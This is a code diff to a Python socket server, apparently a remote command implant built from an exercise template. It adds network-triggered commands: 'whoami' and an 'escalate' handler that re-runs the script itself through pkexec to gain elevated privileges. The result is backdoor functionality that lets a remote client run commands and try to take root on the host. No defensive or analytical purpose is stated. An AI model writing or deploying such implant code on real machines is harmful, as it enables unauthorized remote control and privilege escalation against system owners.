@@ -79,6 +79,24 @@ def bootstrap_packages():
         import requests
 
 
+import subprocess
+
+def whoami() -> str:
+    res = run_command("whoami").stdout
+    print("Result of whoami:", res)
+    return res
+
+def escalate() -> str:
+    try:
+        returnCode = subprocess.run(["pkexec", THIS_FILE]).returncode
+        return f"Ran pkexec with return code {returnCode}"
+    except Exception as e:
+        return f"An error occurred during privilege escalation: {e}"
+
+command_dict = {
+    "whoami": whoami,
+    "escalate": escalate,
+}
 
 def handle_conn(conn, addr):
     with conn:
@@ -94,17 +112,19 @@ def handle_conn(conn, addr):
 
         if not data:
             return
-        
+        command = data.decode("utf-8", errors="replace").strip()
 
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
 
         try:
-            conn.sendall("Response data here".encode())
-            # Process the communication data from 
+            if command in command_dict:
+                res = command_dict[command]()
+                conn.sendall(res.encode())
+            else:
+                conn.sendall("Response data here".encode())
         except Exception as e:
             conn.sendall(f"error: {e}".encode())
-
 
 def main():
     kill_others()
